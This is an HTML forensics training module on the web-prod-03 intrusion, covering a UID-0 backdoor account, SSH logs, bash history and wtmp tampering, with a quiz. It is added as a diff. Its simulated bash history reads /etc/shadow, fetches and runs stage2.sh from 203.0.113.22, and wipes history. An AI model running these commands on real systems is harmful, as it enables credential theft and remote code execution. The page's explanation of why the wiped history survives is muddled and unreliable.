+      Apply what you have learned to the web-prod-03 incident. Work through each evidence
+      excerpt below, then reveal the model analysis to check your reasoning.
+    </p>
+
+    <div class="mini-case">
+      <div class="mini-case__header">
+        <span class="mini-case__icon" aria-hidden="true">🔍</span>
+        <strong>web-prod-03 — Evidence Excerpts</strong>
+      </div>
+      <div class="mini-case__body">
+
+        <!-- Step 1 -->
+        <div class="mini-case__step">
+          <strong>Exhibit A — /etc/passwd excerpt (suspicious lines only)</strong>
+          <pre><code>sysmon:x:1001:1001:System Monitor:/home/sysmon:/bin/bash
+support:x:0:0::/home/support:/bin/bash</code></pre>
+        </div>
+        <p class="mini-case__question">Q1: What is forensically significant about the <code>support</code> account?</p>
+        <button class="reveal-btn" onclick="revealAnswer('r1')" aria-expanded="false" aria-controls="r1">
+          Reveal Analysis
+        </button>
+        <div class="reveal-answer" id="r1" role="region" aria-live="polite">
+          <strong>Analysis:</strong> The <code>support</code> account has UID 0 and GID 0 — it has
+          full root privileges despite the non-root username. This is a classic Linux backdoor account.
+          The empty GECOS field and the home directory <code>/home/support</code> (rather than
+          <code>/root</code>) suggest it was created to be less obvious. Check when
+          <code>/home/support</code> was created and whether it contains an authorized_keys file.
+        </div>
+
+        <!-- Step 2 -->
+        <div class="mini-case__step" style="margin-top:1rem">
+          <strong>Exhibit B — /var/log/auth.log excerpt</strong>
+          <pre><code>Mar  5 02:10:44 web-prod-03 sshd[8801]: Failed password for root from 203.0.113.22 port 52101 ssh2
+Mar  5 02:10:45 web-prod-03 sshd[8801]: Failed password for root from 203.0.113.22 port 52101 ssh2
+Mar  5 02:10:46 web-prod-03 sshd[8801]: message repeated 118 more times: [Failed password for root...]
+Mar  5 02:14:07 web-prod-03 sshd[8821]: Accepted publickey for support from 203.0.113.22 port 54321 ssh2</code></pre>
+        </div>
+        <p class="mini-case__question">Q2: What two phases of attacker activity does this log excerpt show?</p>
+        <button class="reveal-btn" onclick="revealAnswer('r2')" aria-expanded="false" aria-controls="r2">
+          Reveal Analysis
+        </button>
+        <div class="reveal-answer" id="r2" role="region" aria-live="polite">
+          <strong>Analysis:</strong> Phase 1 (02:10–02:11): A brute-force attempt against the root
+          account — 120+ failures in under two seconds indicates automated tooling, not a human typist.
+          The attempts fail, suggesting root direct login was disabled or SSH keys were required.
+          Phase 2 (02:14): Successful public-key authentication for the <code>support</code> backdoor
+          account from the same source IP. This confirms the attacker had already installed an SSH key
+          in <code>/home/support/.ssh/authorized_keys</code> on a prior visit.
+        </div>
+
+        <!-- Step 3 -->
+        <div class="mini-case__step" style="margin-top:1rem">
+          <strong>Exhibit C — /root/.bash_history excerpt</strong>
+          <pre><code>#1741133640
+id
+#1741133641
+cat /etc/shadow
+#1741133655
+wget http://203.0.113.22/stage2.sh -O /tmp/.update
+#1741133657
+chmod +x /tmp/.update && /tmp/.update
+#1741133720
+export HISTFILE=/dev/null
+#1741133721
+cat /dev/null > /root/.bash_history</code></pre>
+        </div>
+        <p class="mini-case__question">Q3: The attacker ran two anti-forensic commands near the end of this log. Why might these commands still be visible?</p>
+        <button class="reveal-btn" onclick="revealAnswer('r3')" aria-expanded="false" aria-controls="r3">
+          Reveal Analysis
+        </button>
+        <div class="reveal-answer" id="r3" role="region" aria-live="polite">
+          <strong>Analysis:</strong> The commands <code>export HISTFILE=/dev/null</code> and
+          <code>cat /dev/null &gt; /root/.bash_history</code> were run <em>in the same session</em>
+          in which history was already being recorded. Bash accumulates history in memory during a
+          session and writes it on exit. When the attacker redirected HISTFILE and then cleared the
+          file, the already-accumulated in-memory history was written to the file path that was
+          current at session start. The clearing command then partially wiped it, but bash had already
+          synced prior commands. Additionally, the overwrite only zeroed the file — it did not
+          securely wipe the disk sectors. The previous content may be recoverable from unallocated
+          space with a tool like Autopsy or Sleuth Kit.
+        </div>
+
+        <!-- Step 4 -->
+        <div class="mini-case__step" style="margin-top:1rem">
+          <strong>Exhibit D — last output (excerpt)</strong>
+          <pre><code>support  pts/0  203.0.113.22  Wed Mar  5 02:14 - 02:31 (00:17)
+wtmp begins Tue Feb  4 09:00</code></pre>
+          <p style="margin-top:.5rem"><em>The system has been running without interruption since installation 14 months ago. The wtmp file is 4 KB.</em></p>
+        </div>
+        <p class="mini-case__question">Q4: What does the wtmp file size suggest, and how would you investigate further?</p>
+        <button class="reveal-btn" onclick="revealAnswer('r4')" aria-expanded="false" aria-controls="r4">
+          Reveal Analysis
+        </button>
+        <div class="reveal-answer" id="r4" role="region" aria-live="polite">
+          <strong>Analysis:</strong> A 14-month-old system with continuous uptime should have a
+          wtmp file containing hundreds or thousands of records — reboots, logins, and run-level
+          changes accumulate over time. Each utmp record is 384 bytes on a 64-bit Linux system.
+          A 4 KB wtmp holds roughly 10 records, which is far too few for 14 months of activity.
+          This strongly suggests the file was truncated or replaced. To investigate further:
+          (1) Check the file's mtime — if it was recently modified, that is additional confirmation.
+          (2) Compare against auth.log to find logins that should appear in wtmp but do not.
+          (3) If a filesystem image is available, search unallocated space for utmp-format binary
+          structures to recover deleted records.
+        </div>
+
+      </div>
+    </div>
+  </section>
+
+  <!-- ── Section 7: Knowledge Check ── -->
+  <section class="section" id="knowledge-check" aria-labelledby="h-knowledge-check">
+    <h2 id="h-knowledge-check">7. Knowledge Check</h2>
+    <p>
+      Test your understanding of the concepts covered in this module.
+      Select the best answer for each question and check your response.
+    </p>
+
+    <!-- Q1 -->
+    <div class="quiz-question">
+      <p id="q1-stem">1. You examine <code>/etc/passwd</code> and find the entry:
+        <code>monitor:x:0:0::/home/monitor:/bin/bash</code>.
+        What is the most forensically significant aspect of this entry?</p>
+      <ul class="quiz-options" role="radiogroup" aria-labelledby="q1-stem">
+        <li>
+          <label>
+            <input type="radio" name="q1" value="A">
+            The account's home directory is <code>/home/monitor</code> rather than <code>/root</code>.
+          </label>
+        </li>
+        <li>
+          <label>
+            <input type="radio" name="q1" value="B">
+            The account has UID 0 and GID 0, giving it full root privileges despite the non-root username.
+          </label>
+        </li>
+        <li>
+          <label>
+            <input type="radio" name="q1" value="C">
+            The account uses <code>/bin/bash</code> as its login shell instead of <code>/bin/sh</code>.
+          </label>
+        </li>
+        <li>
+          <label>
+            <input type="radio" name="q1" value="D">
+            The password field contains <code>x</code>, meaning the password hash is in <code>/etc/shadow</code>.
+          </label>
+        </li>
+      </ul>
+      <button class="check-btn" onclick="checkAnswer(1,'B',this)">Check Answer</button>
+      <div class="quiz-feedback" id="q1-feedback" role="alert" aria-live="polite"></div>
+    </div>
+
+    <!-- Q2 -->
+    <div class="quiz-question">
+      <p id="q2-stem">2. An investigator finds that <code>/var/log/btmp</code> is zero bytes on a server
+        that has been publicly accessible for six months. What is the most likely explanation?</p>
+      <ul class="quiz-options" role="radiogroup" aria-labelledby="q2-stem">
+        <li>
+          <label>
+            <input type="radio" name="q2" value="A">
+            The server was configured with <code>PasswordAuthentication no</code> in sshd_config, so no
+            password-based failures were possible.
+          </label>
+        </li>
+        <li>
+          <label>
+            <input type="radio" name="q2" value="B">
+            btmp is only written when root is logged in, so an idle server would have an empty btmp.
+          </label>
+        </li>
+        <li>
+          <label>
+            <input type="radio" name="q2" value="C">
+            The file was deliberately cleared by an attacker or administrator to remove evidence
+            of failed login attempts.
+          </label>
+        </li>
+        <li>
+          <label>
+            <input type="radio" name="q2" value="D">
+            btmp is automatically rotated and the current file always starts empty after rotation.
+          </label>
+        </li>
+      </ul>
+      <button class="check-btn" onclick="checkAnswer(2,'C',this)">Check Answer</button>
+      <div class="quiz-feedback" id="q2-feedback" role="alert" aria-live="polite"></div>
+    </div>
+
+    <!-- Q3 -->
+    <div class="quiz-question">
+      <p id="q3-stem">3. A forensic examiner finds the following two lines near the end of
+        <code>/root/.bash_history</code>:
+        <code>export HISTFILE=/dev/null</code> followed by
+        <code>cat /dev/null &gt; /root/.bash_history</code>.
+        Which statement best describes what the attacker intended and what actually happened?</p>
+      <ul class="quiz-options" role="radiogroup" aria-labelledby="q3-stem">
+        <li>
+          <label>
+            <input type="radio" name="q3" value="A">
+            The attacker successfully erased all history; the commands are visible only because
+            bash re-creates an empty history file on session start.
+          </label>
+        </li>
+        <li>
+          <label>
+            <input type="radio" name="q3" value="B">
+            The attacker intended to suppress future recording and clear the file, but commands
+            already in the in-memory history buffer were still written when the session ended,
+            leaving partial evidence.
+          </label>
+        </li>
+        <li>
+          <label>
+            <input type="radio" name="q3" value="C">
+            These are standard system maintenance commands and are not forensically significant.
+          </label>
+        </li>
+        <li>
+          <label>
+            <input type="radio" name="q3" value="D">
+            Redirecting HISTFILE does not affect bash history; only <code>history -c</code>
+            clears the history buffer.
+          </label>
+        </li>
+      </ul>
+      <button class="check-btn" onclick="checkAnswer(3,'B',this)">Check Answer</button>
+      <div class="quiz-feedback" id="q3-feedback" role="alert" aria-live="polite"></div>
+    </div>
+
+  </section>
+
+</main>
+
+<script>
+(function () {
+  /* ── Accordion ── */
+  document.querySelectorAll('.accordion__trigger').forEach(function (btn) {
+    btn.addEventListener('click', function () {
+      var expanded = this.getAttribute('aria-expanded') === 'true';
+      this.setAttribute('aria-expanded', String(!expanded));
+      var panel = document.getElementById(this.getAttribute('aria-controls'));
+      if (panel) panel.classList.toggle('is-open', !expanded);
+    });
+    btn.addEventListener('keydown', function (e) {
+      if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); this.click(); }
+    });
+  });
+})();
+
+/* ── Reveal activity ── */
+function revealAnswer(id) {
+  var el = document.getElementById(id);
+  var btn = el ? el.previousElementSibling : null;
+  if (!el) return;
+  var open = el.classList.toggle('is-open');
+  if (btn) {
+    btn.setAttribute('aria-expanded', String(open));
+    btn.textContent = open ? 'Hide Analysis' : 'Reveal Analysis';
+  }
+}
+
+/* ── Knowledge check ── */
+var feedback = {
+  1: {
+    B: {
+      correct: true,
+      text: 'Correct. UID 0 and GID 0 grant full root-level access regardless of the username. ' +
+            'Any account with UID 0 that is not legitimately named "root" is a backdoor account ' +
+            'and should be investigated immediately.'
+    },
+    A: {
+      correct: false,
+      text: 'Incorrect. The home directory location is worth noting but is not the primary concern. ' +
+            'The critical finding is the UID and GID values — both are 0, meaning this account has ' +
+            'root privileges.'
+    },
+    C: {
+      correct: false,
+      text: 'Incorrect. The shell choice (/bin/bash vs /bin/sh) is a minor stylistic difference. ' +
+            'What matters here is that the account has UID 0 and GID 0, granting it full root privileges.'
+    },
+    D: {
+      correct: false,
+      text: 'Incorrect. An "x" in the password field is standard — it just means the actual hash ' +
+            'is stored in /etc/shadow, which is normal. The critical issue is the UID 0 and GID 0 values.'
+    }
+  },
+  2: {
+    C: {
+      correct: true,
+      text: 'Correct. A publicly exposed server will almost always accumulate failed login attempts ' +
+            'within hours of going live — automated scanners are ubiquitous. A zero-byte btmp after ' +
+            'six months strongly suggests deliberate clearing. Option A is worth investigating but ' +
+            'even key-only SSH typically still logs PAM-level failures.'
+    },
+    A: {
+      correct: false,
+      text: 'Partially plausible, but not the best answer. Even with PasswordAuthentication disabled, ' +
+            'some authentication events (PAM failures, invalid users) may still be logged to btmp. ' +
+            'A zero-byte file after six months is more consistent with deliberate clearing.'
+    },
+    B: {
+      correct: false,
+      text: 'Incorrect. btmp records failed login attempts from any source, not just root sessions. ' +
+            'It is written by PAM and sshd whenever an authentication attempt fails, regardless of ' +
+            'whether root is logged in.'
+    },
+    D: {
+      correct: false,
+      text: 'Incorrect. Log rotation creates new empty log files for text logs, but btmp is not a ' +
+            'text log subject to standard logrotate rotation. It accumulates records continuously. ' +
+            'The zero-byte state indicates clearing, not rotation.'
+    }
+  },
+  3: {
+    B: {
+      correct: true,
+      text: 'Correct. Bash accumulates commands in an in-memory history buffer during the session. ' +
+            'Setting HISTFILE=/dev/null prevents future saves to disk, and clearing the file ' +
+            'removes its current contents — but commands already buffered in memory may still be ' +
+            'flushed when the session ends, depending on timing and how bash handles the redirect. ' +
+            'The presence of these anti-forensic commands in the file is itself highly significant evidence.'
+    },
+    A: {
+      correct: false,
+      text: 'Incorrect. Bash does not automatically re-create a history file with old commands. ' +
+            'The commands are visible because they were already written to the file before or during ' +
+            'the anti-forensic actions — the clearing was imperfect.'
+    },
+    C: {
+      correct: false,
+      text: 'Incorrect. These are not routine maintenance commands. Redirecting HISTFILE to /dev/null ' +
+            'and immediately clearing the history file are deliberate anti-forensic actions. Finding ' +
+            'them is significant evidence of an attacker covering their tracks.'
+    },
+    D: {
+      correct: false,
+      text: 'Incorrect. Redirecting HISTFILE to /dev/null does affect history — it prevents bash from ' +
+            'writing the in-memory buffer to a file when the session ends. However, it does not clear ' +
+            'the in-memory buffer already accumulated during the session, which is why partial history ' +
+            'remains visible.'
+    }
+  }
+};
+
+function checkAnswer(qNum, correctVal, btn) {
+  var selected = document.querySelector('input[name="q' + qNum + '"]:checked');
+  var feedbackEl = document.getElementById('q' + qNum + '-feedback');
+  if (!selected) {
+    feedbackEl.className = 'quiz-feedback incorrect';
+    feedbackEl.textContent = 'Please select an answer before checking.';
+    return;
+  }
+  var val = selected.value;
+  var data = feedback[qNum][val];
+  feedbackEl.className = 'quiz-feedback ' + (data.correct ? 'correct' : 'incorrect');
+  feedbackEl.textContent = data.text;
+  btn.disabled = true;
+  btn.style.opacity = '0.6';
+}
+</script>
+
+</body>
+</html>
